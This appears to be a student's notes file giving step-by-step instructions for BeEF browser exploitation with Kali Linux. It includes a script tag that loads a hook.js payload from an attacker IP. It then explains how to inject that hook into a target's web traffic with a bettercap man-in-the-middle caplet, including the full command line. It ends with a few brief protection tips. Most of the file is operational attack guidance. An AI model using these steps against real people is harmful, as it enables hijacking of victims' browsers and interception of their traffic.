@@ -1,0 +1,35 @@
+Beef (browser explotation)
+
+Howt to start:
+1.) Find it or download it on kali Linux
+2.) Start it
+3.) Provide new password
+4.) A browser will pop up (username is "beef")
+
+
+EXAMPLE HOOCK ATTACK:
+1.) Start beef and go to webpage of beef
+2.) Set a webserver and in index.html put the code:
+	<script src="http://192.168.8.112:3000/hook.js"></script>
+	CHANGE THE IP WITH YOURS!
+	(THIS CODE IS FOUND IN BEEF TERMINAL CALLED ("EXAMPLE") 
+3.) Run the webserver on target system and in beef webpage the hook is ready!
+
+
+MAN IN THE MIDDLE HOOK ATTACK
+1.) Copy the folder "beefcustom.zip" in /usr/share/bettercap/caplets
+	(THE FOLDER IS INCLUDED IN THE SAME DIRECTORY AS THIS TXT INSTRUCTION FILE 	WE A RE USING NOW!)
+NOW WE HAVE TO EDIT THOSE FILES IN THE FOLDER WEHN WE PASTE THEM 
+2.) use "nano beefcustom.js" and find the javascript http code and change the ip 	with the attacker's ip	
+	SOMETHIN LIKE THIS: <script src="http://192.168.8.112:3000/hook.js">	</script>
+3.) use "nano beefcustom.cap" and change the target ip
+4.) Run bettercap with caplet 
+	bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap
+	IF IT DOESENT WORK MAKE SHURE FOR THE FILE PATH USING COMMAND "caplets.show" in 	BETTERCAP
+
+LEARN BEEF FURTHER!
+
+PROTECTION:
+- Ajust browser settings not to execute javascript codes! 
+- Additional politics
+- Often check "arp -a" on windows to see if everithyng is okay with the default gateway
